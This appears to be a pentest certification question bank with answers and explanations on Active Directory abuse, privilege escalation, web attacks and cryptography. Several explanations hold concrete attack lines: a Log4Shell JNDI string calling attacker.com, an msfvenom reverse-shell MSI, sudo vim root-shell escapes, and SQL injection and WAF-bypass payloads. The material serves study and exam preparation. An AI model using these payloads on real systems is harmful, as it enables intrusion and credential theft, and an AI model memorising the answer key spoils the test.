    {id:"3-44",domain:"ActiveDirectory",difficulty:"hard",q:"BloodHound analysis reveals a path: Domain Users -> WriteDACL -> GPO -> GPO Applies To -> Domain Controllers OU. What attack does this enable?",opts:["Domain Users can modify Group Policy settings affecting all domain computers","Domain Users have WriteDACL on the GPO — they can modify the GPO's ACL to grant themselves write access, then modify GPO settings to execute malicious code on all domain controllers at next Group Policy refresh","Domain Users can read all GPO settings and extract sensitive configuration information","Domain Users can delete GPOs affecting domain controllers, causing a denial of service"],ans:1,exp:"WriteDACL on a GPO: (1) Modify the GPO ACL to grant yourself GenericAll (full control) over the GPO, (2) Edit the GPO to add a startup script, scheduled task, or registry key that executes a payload, (3) Wait for Group Policy refresh (default 90 minutes) on domain controllers. The payload executes as SYSTEM on every DC in the target OU. Full domain compromise from Domain Users."},
    {id:"3-45",domain:"ActiveDirectory",difficulty:"hard",q:"An AD user has SID history enabled with 'OldDomain\\Domain Admins' SID in their SID history. What is the security implication?",opts:["The user can authenticate to OldDomain but has no additional privileges in the current domain","The user effectively has Domain Admin privileges in both domains — SID history is included in Kerberos tickets and access tokens, granting the historical group memberships' privileges","SID history only affects file ACLs on migrated file servers, not authentication privileges","SID history is disabled in modern AD environments and has no security impact"],ans:1,exp:"SID history abuse: when a user has a high-privileged SID (e.g., Domain Admins S-1-5-21-[OldDomain]-512) in their SID history, that SID is included in their Kerberos PAC (Privilege Attribute Certificate). Resources that grant access to OldDomain\\Domain Admins will grant access to this user — effectively granting them those privileges if OldDomain trusts are still active."},
    {id:"3-46",domain:"Post-Exploitation",difficulty:"hard",q:"Meterpreter session running. 'getpid' then 'migrate 624' where PID 624 is svchost.exe. Why is migration to svchost.exe preferred?",opts:["svchost.exe has elevated privileges automatically inherited by migrated session","svchost.exe is a legitimate system process less likely to be terminated; migrating provides process stability and may inherit higher-integrity token and privileges","svchost.exe bypasses Windows Defender by design since it's on the exclusion list","Migration to svchost.exe establishes persistence through the Service Control Manager"],ans:1,exp:"Process migration benefits: (1) Stability — svchost.exe runs continuously (user-land exploits may terminate), (2) OPSEC — Meterpreter threads inside svchost are harder to detect than a standalone meterpreter.exe, (3) Privilege — svchost.exe runs as SYSTEM or NETWORK SERVICE, potentially inheriting those tokens. Verify target process privilege level before migrating."},
    {id:"3-47",domain:"Post-Exploitation",difficulty:"hard",q:"'whoami /priv' shows SeImpersonatePrivilege: Enabled on Windows Server 2016. Which Potato attack variant is the reliable choice?",opts:["Hot Potato (NBNS/WPAD abuse) works on Server 2016 without restrictions","PrintSpoofer or JuicyPotato; JuicyPotato may not work on Server 2016+ so PrintSpoofer is the reliable choice","Rotten Potato which works universally on all Windows versions","Sweet Potato targeting Windows Server 2016 SP1 specifically"],ans:1,exp:"JuicyPotato uses COM object abuse with specific CLSIDs. Many CLSIDs are patched in Server 2016/Windows 10 1809+. PrintSpoofer (by itm4n) uses the Windows Print Spooler named pipe impersonation technique — reliable on Server 2016+. RoguePotato is another Server 2016+ alternative. PrintSpoofer command: PrintSpoofer.exe -i -c 'cmd /c whoami'."},
    {id:"3-48",domain:"Post-Exploitation",difficulty:"hard",q:"Meterpreter on Windows domain machine as local admin. 'hashdump' returns only local hashes. Why not domain hashes, and how to get them?",opts:["hashdump requires SYSTEM on DC; upgrade to domain admin and run remotely","Domain hashes are not stored locally in the SAM (except as cached credentials); to get domain hashes, compromise the DC and use secretsdump against NTDS.dit","hashdump with '--domain' flag retrieves domain hashes from any domain-joined machine","Domain hashes are in LSA secrets requiring '--lsa' flag with hashdump"],ans:1,exp:"Domain account password hashes are ONLY stored in the NTDS.dit file on domain controllers. The local SAM database on a domain-joined workstation contains only LOCAL account hashes. Domain accounts that have logged into the machine have cached credential hashes (MSCACHE/DCC2) in HKLM\\SECURITY — retrievable but require higher difficulty cracking."},
    {id:"3-49",domain:"Post-Exploitation",difficulty:"hard",q:"Mimikatz on Windows 10 (updated): sekurlsa::logonpasswords returns hashes but no cleartext. Why doesn't WDigest produce cleartext credentials?",opts:["Windows 10 uses TPM encryption preventing Mimikatz from reading LSASS memory","WDigest stores credentials in cleartext only if HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential=1; modern Windows defaults to 0","Windows 10 Credential Guard isolates all credentials in hypervisor-protected VTL1","Windows 10 uses NTLM only; WDigest completely removed from OS"],ans:1,exp:"WDigest authentication (RFC 2617 HTTP Digest): requires plaintext credentials to compute the digest response. KB2871997 (2014) added UseLogonCredential registry value defaulting to 0 (disabled) on Windows 8.1/Server 2012 R2+. Setting UseLogonCredential=1 (requires reboot and new logon) re-enables cleartext storage in LSASS."},
    {id:"3-50",domain:"Post-Exploitation",difficulty:"hard",q:"Scheduled task for persistent daily execution. Which schtasks command is correct?",opts:["schtasks /create /tn \"Update\" /tr \"C:\\payload.exe\" /sc daily /st 09:00 /ru SYSTEM /f","schtasks /add /name \"Update\" /run \"C:\\payload.exe\" /schedule daily /time 09:00","at 09:00 /every:Monday,Tuesday C:\\payload.exe","schtasks /register /task \"Update\" /command \"C:\\payload.exe\" /repeat daily"],ans:0,exp:"schtasks /create syntax: /tn=task name, /tr=task run (command), /sc=schedule type (daily/weekly/once), /st=start time (HH:MM), /ru=run as user (SYSTEM requires admin), /f=force overwrite existing task. The AT command is deprecated in modern Windows. /add and /register are not valid schtasks parameters."},
    {id:"3-51",domain:"Web",difficulty:"hard",q:"SMB share with read/write access. A 'desktop.ini' file is placed in the share. When a Windows user browses it in Explorer, what attack does this enable?",opts:["Remote code execution via Windows Shell handler for .ini files","Automatic capture of NTLMv2 hashes when Windows client tries to authenticate to the UNC path referenced in desktop.ini; Responder listens for the authentication","Kerberos ticket harvesting via UNC path's Kerberos SPN registration","Remote DLL injection through shell extension handler for .ini files"],ans:1,exp:"desktop.ini NTLM capture: create a desktop.ini containing [.ShellClassInfo] IconResource=\\\\attacker\\share\\icon.ico. When Windows Explorer renders the directory, it automatically tries to load the icon from the UNC path — triggering NTLM authentication to the attacker's Responder/Impacket SMB server. Captures NTLMv2 hashes without any user interaction beyond browsing the share."},
    {id:"3-52",domain:"Web",difficulty:"hard",q:"JNDI injection: '${jndi:ldap://attacker.com/payload}' submitted. What does JNDI lookup enable in vulnerable Java versions?",opts:["JNDI queries the attacker's LDAP server for text data only; no code execution possible","Vulnerable application connects to attacker's LDAP server which returns a serialized Java object; JVM instantiates the class, executing attacker-controlled code","JNDI injection only enables SSRF by causing outbound connections; no code execution possible","LDAP response replaces the log message with attacker-controlled text, enabling log injection"],ans:1,exp:"Log4Shell (CVE-2021-44228): Log4j2's JNDI lookup processes ${jndi:ldap://...} in log messages. The JVM connects to the LDAP server. The LDAP server returns a reference to a remote Java class. The JVM loads and instantiates the class — executing attacker-controlled code. Affects Log4j2 versions before 2.15.0. One of the most severe vulnerabilities in modern history."},
    {id:"3-53",domain:"Networking",difficulty:"hard",q:"IKEv1 aggressive mode vs main mode with PSK auth. Which has a specific weakness enabling offline cracking?",opts:["IKEv1 main mode with PSK leaks identity allowing dictionary attacks against XAUTH","In aggressive mode, PSK hashes are sent without identity protection and can be captured for offline cracking; main mode is not directly vulnerable","IKEv1 uses DES for phase 1 which can be brute forced to recover PSK","IKEv1 main mode PSK exchanges are transmitted in cleartext"],ans:1,exp:"IKEv1 aggressive mode with PSK: unlike main mode (6 messages with identity protected), aggressive mode (3 messages) sends the hash of the pre-shared key AND identity in the clear before the phase 1 SA is established. An attacker can capture this hash and crack it offline (psk-crack tool, hashcat). ike-scan can force aggressive mode on some implementations."},
    {id:"3-54",domain:"Networking",difficulty:"hard",q:"Bettercap MITM observes HTTPS traffic downgraded to HTTP for some sites. What attack mechanism achieves this downgrade?",opts:["SSLStrip: intercepts initial HTTP request before HTTPS redirect, proxies HTTPS to server, serves HTTP to client; sites without HSTS preloading are vulnerable","POODLE: forces SSL 3.0 fallback which Bettercap exploits","BEAST: CBC mode attacks on TLS 1.0 allow decryption","FREAK: forces export-grade cipher negotiation"],ans:0,exp:"SSLStrip (Moxie Marlinspike, 2009): intercepts the first HTTP request before the server redirects to HTTPS. Bettercap serves HTTP to the client (appears as http://) while proxying HTTPS to the real server. Works against sites without HSTS preloading. HSTS (max-age + preloading) is the mitigation — browsers refuse HTTP for HSTS-protected sites."},
    {id:"3-55",domain:"Networking",difficulty:"hard",q:"An open resolver (allows recursive queries from any IP address) is found. Beyond DNS amplification DDoS, what additional attack is enabled?",opts:["DNS zone transfer of all zones hosted on the resolver","DNS cache poisoning: by flooding the resolver with forged responses to queries it's making recursively, an attacker can poison its cache to redirect users to malicious IP addresses","Subdomain takeover by registering expired delegated subdomains","DNS rebinding attacks requiring JavaScript to be executed in the victim's browser"],ans:1,exp:"DNS cache poisoning against an open resolver: by flooding the resolver with forged responses (matching the query ID before the legitimate response arrives — Kaminsky attack), an attacker can poison the cache. Clients using this resolver will be redirected to attacker-controlled IPs for poisoned domains. DNSSEC and source port randomisation are mitigations."},
    {id:"3-56",domain:"Web",difficulty:"hard",q:"Application vulnerable to blind SQL injection. The application takes 5+ seconds to respond when 'AND SLEEP(5)--' is injected (MySQL). What information can be extracted using time-based blind injection?",opts:["Only Boolean true/false conditions can be tested; data extraction is not possible with time-based blind injection","Any database content can be extracted bit-by-bit using conditional time delays; though slow, full data extraction is possible","Only the database version can be retrieved via time-based blind injection","Time-based injection only works to confirm the vulnerability; sqlmap cannot automate data extraction via this method"],ans:1,exp:"Time-based blind SQLi allows full data extraction through conditional queries: IF(condition, SLEEP(5), SLEEP(0)). Testing one bit at a time (e.g., IF(ORD(SUBSTR(password,1,1))>64, SLEEP(5), SLEEP(0))) extracts every character. sqlmap --technique=T fully automates this. It's slow but complete — binary search halves the number of queries needed per character."},
    {id:"3-57",domain:"Web",difficulty:"hard",q:"GraphQL endpoint with default introspection enabled. What should a tester do first?",opts:["Attempt DoS by sending deeply nested GraphQL queries","Use introspection to enumerate all types, queries, mutations, and arguments to understand the full attack surface; then craft targeted attacks","Disable introspection via the API to demonstrate the vulnerability","Submit invalid types to trigger server errors revealing framework version"],ans:1,exp:"GraphQL introspection reveals the complete API schema: all query/mutation types, field names, argument names and types. This enables targeted attacks on sensitive operations (e.g., updateUserRole, adminDeleteUser). Query: {__schema{types{name fields{name type{name}}}}}. Disable introspection in production environments."},
    {id:"3-58",domain:"Methodology",difficulty:"medium",q:"UK Computer Misuse Act 1990 Section 1 creates an unauthorised access offence. What provides legal defence during a pentest?",opts:["The penetration tester's CREST certification","Written authorisation from the data controller or system owner documented in a signed rules of engagement or scope agreement","Verbal agreement with IT manager communicated via email","The penetration test contract between testing company and client"],ans:1,exp:"CMA 1990 s.1: unauthorised access to computer material. Defence: the access is AUTHORISED. Authorisation must come from someone with legal authority to grant it. It must be in writing (email at minimum, signed RoE preferred). The tester's certification doesn't provide authorisation — only the system owner can do that."},
    {id:"3-59",domain:"Methodology",difficulty:"hard",q:"0-day found during engagement affecting systems beyond client scope. Correct responsible disclosure approach?",opts:["Publish vulnerability details immediately","Notify client, advise compensating controls, and follow coordinated disclosure: notify vendor privately, agree timeline, release details only after patch is available","Exploit further to document full impact before reporting","Notify CREST immediately as certifying body"],ans:1,exp:"Responsible/coordinated disclosure: (1) Notify the client immediately, (2) Privately notify the affected vendor with details and proposed disclosure timeline (typically 90 days — Google Project Zero standard), (3) Work with vendor on patch development, (4) Release publicly after a patch is available or timeline expires. Publishing immediately endangers all users."},
    {id:"3-60",domain:"Methodology",difficulty:"medium",q:"RoE specifies 'no DoS testing without CTO sign-off'. DoS vulnerability found; CTO unavailable. Correct action?",opts:["Perform limited DoS test during off-hours","Document the theoretical DoS vector without exploiting it; note in report that exploitation not performed due to engagement constraints","Ask CISO for verbal approval","Perform DoS test; report and apologise afterward"],ans:1,exp:"Rules of Engagement are contractual and legal constraints. If a specific activity requires explicit written sign-off from a named individual and that person is unavailable, the activity CANNOT proceed. The finding is documented as theoretical. The report recommends the client arrange a subsequent authorised maintenance window for validation. Violating RoE terms invalidates the legal protection."},
    {id:"3-61",domain:"Cryptography",difficulty:"hard",q:"Application uses AES-128-CBC with a static, hardcoded IV. What specific attack does this enable?",opts:["Padding oracle attack since IV is not randomised","If same IV used for multiple encryptions with same key, XORing two ciphertexts of known plaintexts reveals XOR of plaintexts, leaking information about encrypted data","Brute force of the AES key is possible when IV is static","CBC chaining breaks if IV is static, causing decryption to fail"],ans:1,exp:"When IV is static (same for all messages), encrypting the same plaintext always produces the same ciphertext (since first CBC block = P XOR IV, always same). More critically: if C1=CBC(P1, IV, K) and C2=CBC(P2, IV, K), and you know P1, then C1 XOR C2 = P1 XOR P2 — revealing information about P2. Nonce reuse in CBC allows IV-based chosen plaintext attacks."},
    {id:"3-62",domain:"Cryptography",difficulty:"hard",q:"CBC padding oracle vulnerability found. What can a fully weaponised padding oracle accomplish?",opts:["Recover the AES key directly from padding oracle responses","Decrypt arbitrary ciphertext blocks without knowing the encryption key, and potentially encrypt arbitrary plaintext","Perform DoS via infinite padding loop errors","Recover the HMAC signing key"],ans:1,exp:"CBC Padding Oracle: by making modified ciphertext requests and observing valid/invalid padding responses, you can decrypt any ciphertext block-by-block without knowing the key. Full exploitation: decrypt entire ciphertext (e.g., extract plaintext session cookies) AND encrypt arbitrary plaintext (forge valid encrypted values). PKCS#7 padding validation must be constant-time to prevent this."},
    {id:"3-63",domain:"Cryptography",difficulty:"hard",q:"A tester runs sslscan against a target and finds SSLv3 is enabled. Which specific padding oracle attack targets SSLv3?",opts:["BEAST","POODLE","CRIME","DROWN"],ans:1,exp:"POODLE (Padding Oracle On Downgraded Legacy Encryption) specifically exploits SSLv3's CBC padding implementation. SSLv3 uses non-deterministic padding that allows a padding oracle to decrypt one byte per ~256 requests. BEAST targets TLS 1.0 CBC. CRIME targets TLS/SPDY compression. DROWN targets SSLv2 key material reuse with RSA."},
    {id:"3-64",domain:"Cryptography",difficulty:"hard",q:"TLS certificate is signed using SHA-1. What specific risk does SHA-1 signing present?",opts:["SHA-1 certificates cannot support EV status","SHA-1 vulnerable to collision attacks; attacker could potentially forge a certificate with the same SHA-1 hash undermining PKI trust","SHA-1 certificates have 1-year maximum validity","SHA-1 doesn't support ECDHE weakening forward secrecy"],ans:1,exp:"SHA-1 collision attacks (demonstrated by Google's SHAttered attack in 2017) produce two different documents with the same SHA-1 hash. For certificate signing, this theoretically allows forging a certificate that has the same signature as a legitimate one. Major browsers deprecated SHA-1 by 2017. SHA-256 (SHA-2 family) is the minimum recommended."},
    {id:"3-65",domain:"ActiveDirectory",difficulty:"hard",q:"Computer has TrustedForDelegation=TRUE (unconstrained). Administrator connects to this machine. What does the attacker gain?",opts:["The administrator's password hash from LSASS memory","A copy of the administrator's TGT is cached in the machine's LSASS; attacker can extract and impersonate the administrator to ANY service in the domain","The administrator's NTDS.dit credentials are synchronised to the machine","Administrator's Kerberos service tickets are visible in the machine's credential cache"],ans:1,exp:"Unconstrained delegation: when a user authenticates to a service with this flag, the KDC includes a copy of the user's TGT in the TGS (Forwardable flag set). The machine receives and caches this TGT in LSASS. An attacker controlling this machine can extract the TGT with Mimikatz (sekurlsa::tickets) and use it to impersonate the user to ANY service — including the DC."},
    {id:"3-66",domain:"ActiveDirectory",difficulty:"hard",q:"BloodHound edge 'ForceChangePassword' on a target user object. What does this allow?",opts:["Read the target user's current password hash","Reset the target user's password WITHOUT knowing the current password, enabling account takeover","Lock the target user's account","Disable the target user's account by setting password expiry to a past date"],ans:1,exp:"ForceChangePassword (ExtendedRight: User-Force-Change-Password) allows resetting a user's AD password without providing the current password. Use: net user <username> <newpassword> /domain, or PowerShell: Set-ADAccountPassword. Then authenticate as that user. Note: may invalidate existing encryption (EFS files) and break other password-derived keys."},
    {id:"3-67",domain:"ActiveDirectory",difficulty:"hard",q:"GPP XML files in SYSVOL have cpassword attributes. Why is this a critical finding?",opts:["GPP passwords are stored using a proprietary algorithm requiring the SYSTEM key","The AES-256 key used to encrypt cpassword was published by Microsoft in MSDN, making all cpassword values decryptable by anyone","GPP passwords are NTLM hashes that can be passed directly","SYSVOL is only readable by domain admins so this is low risk"],ans:1,exp:"Microsoft published the AES-256 key used to encrypt Group Policy Preferences passwords in MSDN documentation (KB2962486). Any domain user can read SYSVOL, find cpassword attributes, and decrypt them using gpp-decrypt or PowerSploit's Get-GPPPassword. MS13-006 addressed this for new GPP settings but legacy preferences may still exist."},
    {id:"3-68",domain:"Web",difficulty:"hard",q:"SSRF vulnerability found. Internal network uses RFC 1918 addressing. Which URI probes the AWS EC2 metadata service from within a cloud environment?",opts:["http://127.0.0.1/latest/meta-data/","http://169.254.169.254/latest/meta-data/","http://10.0.0.1/latest/meta-data/","http://192.168.1.1/latest/meta-data/"],ans:1,exp:"169.254.169.254 is the link-local address for cloud metadata services: AWS IMDSv1/v2, Azure IMDS, GCP metadata. AWS endpoint returns IAM role temporary credentials, instance ID, security groups, etc. This is a critical SSRF target in cloud environments. IMDSv2 requires a PUT request first to get a session token — IMDSv1 is directly readable."},
    {id:"3-69",domain:"Web",difficulty:"hard",q:"Nikto shows 'Server: Apache/2.2.14 (Ubuntu)'. What is the CORRECT next step before attempting exploits?",opts:["Immediately run the Apache 2.2.14 Metasploit module","Verify: check if the vulnerable module is loaded, if patches backported by Ubuntu, and confirm exploitability in context","Run Nikto again with -evasion option","Use Shodan to find other instances to test exploits safely"],ans:1,exp:"Debian/Ubuntu routinely backport security fixes without changing version numbers. 'Apache/2.2.14' on Ubuntu may have all subsequent security patches applied while still reporting 2.2.14. Always check: dpkg -l apache2, apt-get changelog apache2, or the full Server header. Exploiting a patched system wastes time and causes unnecessary disruption."},
    {id:"3-70",domain:"Web",difficulty:"medium",q:"What is the security assessment value of the robots.txt file?",opts:["Prevents automated scanners from finding the application","Instructs search engine crawlers which paths to exclude; these often reveal sensitive areas like /admin, /backup, /config that developers wanted hidden from search engines","Lists all valid URL paths providing a complete sitemap","Controls browser access to sensitive cookies via crawl-delay directive"],ans:1,exp:"robots.txt Disallow entries frequently reveal sensitive paths: /admin, /backup, /dev, /test, /staging, /internal, /config, /phpinfo.php. Developers add these to prevent search engine indexing, inadvertently advertising them to attackers. Always check robots.txt early in web app assessments. Also check: sitemap.xml, .well-known/, and archive.org for historical robots.txt entries."},
    {id:"3-71",domain:"Networking",difficulty:"medium",q:"A subnet is configured as 10.10.20.0/28. How many total IP addresses exist in this subnet and how many are usable by hosts?",opts:["32 total, 30 usable","16 total, 14 usable","14 total, 12 usable","8 total, 6 usable"],ans:1,exp:"/28 = 4 host bits. 2^4 = 16 total addresses. 16 - 2 (network + broadcast) = 14 usable hosts. Subnet mask: 255.255.255.240. For 10.10.20.0/28: range .0-.15, broadcast .15, usable .1-.14. Quick formula: usable = 2^(32-prefix) - 2."},
    {id:"3-72",domain:"Networking",difficulty:"medium",q:"Traceroute shows hops 6-30 timing out after a boundary router at hop 5. Most likely explanation?",opts:["Target hosts are offline","Firewall/ACL at the boundary drops ICMP TTL-exceeded messages, making further hops invisible to traceroute","Routing table at hop 5 is corrupted causing loops","Target network uses RFC 1918 addresses incompatible with traceroute"],ans:1,exp:"Firewalls commonly block ICMP TTL-exceeded messages (type 11) which traceroute relies on. Beyond the firewall hop, traceroute shows nothing. This doesn't mean the target is unreachable — the intervening routers aren't generating ICMP TTL-exceeded replies. TCP traceroute (hping3 -T or nmap --traceroute) may penetrate further using allowed ports."},
    {id:"3-73",domain:"Networking",difficulty:"medium",q:"MAC address 00:0C:29:XX:XX:XX seen in arp -a output. What does this OUI indicate?",opts:["Cisco Systems network device","VMware virtualised network interface","Dell server hardware","HP ProCurve network infrastructure"],ans:1,exp:"OUI (Organizationally Unique Identifier) 00:0C:29 is assigned to VMware, Inc. This indicates a VMware virtual machine. 00:50:56 is also VMware. Identifying VMware VMs is operationally useful — it helps understand the environment (virtual infrastructure, possible VMware vulnerabilities, vMotion, shared storage implications)."},
    {id:"3-74",domain:"Networking",difficulty:"hard",q:"DNS zone transfer: 'dig axfr @ns1.target.com target.com' succeeds. Why is this significant?",opts:["Zone transfers expose the DNS server's administrative credentials","Reveals the complete internal DNS infrastructure: all hostnames, IPs, mail servers, and network topology — eliminating need for network scanning","Zone transfers allow modification of DNS records","Indicates DNS server vulnerable to cache poisoning"],ans:1,exp:"A successful zone transfer (AXFR) reveals the entire DNS zone: A/AAAA records (all hostnames and IPs), MX records, CNAME records, TXT records (SPF, DKIM), NS records, SRV records. This eliminates the need for network scanning — you have the complete map. Critical finding requiring immediate remediation."},
    {id:"3-75",domain:"Web",difficulty:"hard",q:"An application uses Content-Type: application/json but also accepts Content-Type: application/x-www-form-urlencoded. What CSRF risk does this create?",opts:["SQL injection via content-type confusion","CSRF: CORS simple requests allow form-encoded content without a preflight; a CSRF attack can use form-encoded body (a simple request) instead of JSON, bypassing CORS preflight that would normally block cross-origin JSON requests","XSS via the content-type header injection","Parameter pollution enabling second-order SQL injection"],ans:1,exp:"Accepting both JSON and form-encoded bodies can bypass CSRF protections: CORS simple requests allow Content-Type: application/x-www-form-urlencoded, text/plain, and multipart/form-data without a preflight. A CSRF attack can use a form-encoded body instead of JSON, bypassing CORS preflight that would normally block cross-origin JSON requests. The SameSite cookie attribute or CSRF tokens address this."},
    {id:"3-76",domain:"Methodology",difficulty:"medium",q:"A penetration tester completes a test and the client's dev team asks for 'proof of concept code' for all vulnerabilities. Engagement terms don't explicitly address this. What is the appropriate response?",opts:["Provide all PoC code since it helps developers understand and fix vulnerabilities","Consult the engagement agreement and if silent, check with legal/management; PoC code delivery increases risk if mishandled and may require additional contractual provisions","Refuse to provide PoC code under any circumstances as it violates CREST's code of conduct","Provide obfuscated PoC code that demonstrates the concept without being directly weaponisable"],ans:1,exp:"PoC code delivery is a business and legal decision. Risks if mishandled: (1) PoC code leaks beyond the intended recipients, (2) Used offensively rather than defensively, (3) Stored insecurely after remediation. If the engagement agreement doesn't address this, it requires a separate agreement covering: who receives it, how it's stored, when it's destroyed, and liability for misuse."},
    {id:"3-77",domain:"Methodology",difficulty:"medium",q:"A client requests pentest findings be shared with their parent company's security team. Agreement only covers the subsidiary. What should the tester do?",opts:["Share since parent company is responsible for group security","Obtain written consent from the client (subsidiary) before sharing with third parties not named in the original agreement","Redact sensitive technical details before sharing","Decline; CMA prohibits sharing engagement details with third parties"],ans:1,exp:"Confidentiality obligations: information obtained during an engagement is confidential to the contracting party. Sharing with any third party (even the parent company) requires explicit written consent from the client. The agreement should be amended to include the parent company, or a new NDA/disclosure agreement signed."},
    {id:"3-78",domain:"Post-Exploitation",difficulty:"hard",q:"Windows host has 'Always Install Elevated' enabled in both HKLM and HKCU. What privilege escalation does this enable?",opts:["Any user can install services running as SYSTEM via SCM","Any user can install MSI packages with SYSTEM privileges; a malicious MSI installer executes code as SYSTEM","Current user can modify HKLM keys without UAC prompts","Any user can enable SeDebugPrivilege without admin approval"],ans:1,exp:"AlwaysInstallElevated: when both registry keys are set to 1, Windows Installer runs ALL .msi installations with SYSTEM privileges. Create a malicious MSI (msfvenom -p windows/x64/shell_reverse_tcp -f msi > payload.msi) and run it: msiexec /quiet /qn /i payload.msi. Shell arrives as SYSTEM."},
    {id:"3-79",domain:"Unix",difficulty:"hard",q:"sudoers entry: 'www-data ALL=(ALL) NOPASSWD: /usr/bin/vim'. Which GTFOBin achieves root shell?",opts:["sudo vim -c ':!/bin/bash' to spawn a shell with sudo privileges","sudo vim /etc/sudoers to modify the file and add www-data to root group","Run sudo vim and use file manager to browse to /etc/shadow","Use sudo vim to edit /etc/passwd and add a new root-level user"],ans:0,exp:"Vim GTFOBin for sudo: 'sudo vim -c \":!/bin/bash\"' or 'sudo vim' then ':set shell=/bin/bash' and ':shell'. Vim's :! command runs OS commands. Since vim is run with sudo, the shell spawns as root. Alternative: sudo vim -c ':py import os; os.execl(\"/bin/sh\",\"sh\",\"-c\",\"reset; exec sh\")'. GTFOBins.github.io documents escape techniques for 100+ binaries."},
    {id:"3-80",domain:"Post-Exploitation",difficulty:"hard",q:"NTLMv2 hashes captured. Hashcat fails to crack after 24 hours. What alternative attack leverages captured hashes WITHOUT cracking?",opts:["Pass-the-hash using NTLMv2 hash directly","NTLM relay attack: relay captured authentication to another service in real-time, authenticating as victim without knowing their password","Kerberoasting using the NTLMv2 hash to derive a service ticket","Session hijacking using NTLMv2 hash to predict session key"],ans:1,exp:"Net-NTLMv2 hashes (captured by Responder) CANNOT be passed directly — unlike NTLM hashes (SAM dump), Net-NTLMv2 includes a challenge and is session-specific. However, NTLM relay works in real-time: when a Windows client sends NTLMv2 authentication, relay it to another service (LDAP, SMB, HTTP, MSSQL) to authenticate as the victim. Use ntlmrelayx.py."},
    {id:"3-81",domain:"Networking",difficulty:"hard",q:"802.1X port-based NAC on wired network. Tester bypasses using an IP phone as pass-through. What technique?",opts:["ARP spoofing to impersonate the authenticated IP phone MAC","MAC spoofing/NAC bypass: 802.1X authenticates the IP phone; by connecting through the phone's switch port, tester's device inherits the authenticated session","Evil twin attack impersonating corporate wireless AP","802.1Q VLAN hopping through the IP phone's trunk port"],ans:1,exp:"Cisco IP phones have a built-in 2-port switch: one port to the wall (uplink to corporate switch) and one port to a PC. The 802.1X authentication of the phone authenticates the port, and many deployments pass-through the PC's traffic on the voice/data VLAN without re-authenticating. By connecting to the PC port, traffic is bridged through the authenticated phone connection."},
    {id:"3-82",domain:"Networking",difficulty:"hard",q:"Internal service at 10.10.10.50:8080 accessible only from a compromised host. Which SSH command creates the appropriate local forward?",opts:["ssh -L 8080:10.10.10.50:8080 user@compromised_host","ssh -R 8080:10.10.10.50:8080 user@compromised_host","ssh -D 8080 user@compromised_host","ssh -N -f user@compromised_host"],ans:0,exp:"SSH -L <local_port>:<remote_host>:<remote_port> <ssh_server>: creates a LOCAL forward. The attacker's machine listens on port 8080; connections are forwarded through the SSH tunnel to the compromised host, which then connects to 10.10.10.50:8080. -R creates a REMOTE (reverse) tunnel. -D creates a SOCKS proxy. After running: http://localhost:8080 on attacker reaches the internal service."},
    {id:"3-83",domain:"Windows",difficulty:"hard",q:"UAC set to 'Always Notify'. Which bypass technique is rendered ineffective compared to default settings?",opts:["DLL hijacking in system directories","Auto-elevation COM object abuse (fodhelper, eventvwr) bypasses are blocked since ALL elevation triggers a UAC prompt with 'Always Notify'","Token impersonation via SeImpersonatePrivilege","Pass-the-hash attacks since 'Always Notify' enforces NTLMv2"],ans:1,exp:"'Always Notify' requires a UAC prompt for ALL elevation attempts — including binaries with autoElevate=true in their manifests (what fodhelper, eventvwr, cmstp bypasses exploit). With default UAC, these auto-elevate silently. With 'Always Notify', the user sees every elevation request, blocking auto-elevation UAC bypasses. Token manipulation with existing elevated tokens is unaffected."},
    {id:"3-84",domain:"Post-Exploitation",difficulty:"hard",q:"C2 framework uses DNS-over-HTTPS (DoH) for C2 communication. What detection evasion benefit does this provide?",opts:["DoH bypasses all network monitoring since it uses port 443 which organisations cannot block","Traditional DNS monitoring cannot inspect DoH traffic (encrypted HTTPS to a DoH resolver); DNS-based C2 detection is bypassed since DNS queries are not visible on the wire","DoH automatically encrypts payload with AES-256 preventing all network-based detection","DoH C2 traffic is indistinguishable from normal HTTPS traffic to any commercial sandbox"],ans:1,exp:"DNS over HTTPS: DNS queries are encapsulated in HTTPS (port 443) to a DoH resolver. Traditional DNS monitoring (inspecting port 53 traffic, passive DNS logging on the resolver) sees nothing. DoH defenders must: monitor DoH resolver usage via HTTPS inspection, use DNS firewall that intercepts DoH, or use MDM to force device DNS settings."},
    {id:"3-85",domain:"Web",difficulty:"hard",q:"WAF is blocking SQL injection. Payload used: 'SEL/**/ECT/**/ 1,2,3/**/FR/**/OM/**/users'. What WAF bypass technique?",opts:["URL encoding of reserved SQL characters","Inline comment insertion (/**/) to break SQL keywords while maintaining MySQL/MSSQL syntactic validity; some WAFs fail to handle fragmented keywords","Case variation (SeLeCt) to bypass case-sensitive WAF rules","HTTP parameter pollution to split SQL payload across multiple parameter values"],ans:1,exp:"MySQL and MSSQL parse SQL comments (/**/) as whitespace within keywords: SEL/**/ECT = SELECT in MySQL. WAFs that tokenise 'SELECT' as a keyword may fail to match 'SEL/**/ECT'. Other WAF bypass techniques: URL encoding (%53%45%4C%45%43%54), double URL encoding, Unicode encoding, HTTP parameter pollution, chunked transfer encoding fragmentation."},
    {id:"3-86",domain:"Networking",difficulty:"medium",q:"Internal network host with open port 5985. What service and what attack capability?",opts:["SMB alternative port; same capabilities as port 445","WinRM/PowerShell Remoting; with valid credentials provides interactive PowerShell sessions, command execution, and file transfer similar to SSH","RDP alternative port; provides full graphical remote desktop","LDAP alternative port for AD queries when 389 is filtered"],ans:1,exp:"TCP 5985 = HTTP WinRM (Windows Remote Management) / PowerShell Remoting. TCP 5986 = HTTPS WinRM. WinRM enables: Enter-PSSession for interactive remote PowerShell, Invoke-Command for remote script execution, WMI operations, file transfer. With valid credentials: evil-winrm (Linux tool), or PowerShell's Enter-PSSession. Similar capability to SSH for Windows management."},
    {id:"3-87",domain:"Web",difficulty:"hard",q:"Burp Suite reports 'HTTP Request Smuggling'. What does this exploit?",opts:["Inconsistent handling of HTTP methods between WAF and backend","Discrepancies in how frontend (proxy/load balancer) and backend parse Content-Length and Transfer-Encoding headers, allowing injection of requests into another user's session or bypass of security controls","Compression-based side-channel attacks exploiting shared TCP connections","Session token prediction based on HTTP request timing"],ans:1,exp:"HTTP Request Smuggling: exploits ambiguity between how front-end and back-end parse HTTP requests. When Content-Length and Transfer-Encoding conflict, each may consider different bytes as the 'end' of the request. An attacker 'smuggles' a partial request that gets prepended to the next user's request, poisoning it. Variants: CL.TE, TE.CL, TE.TE."},
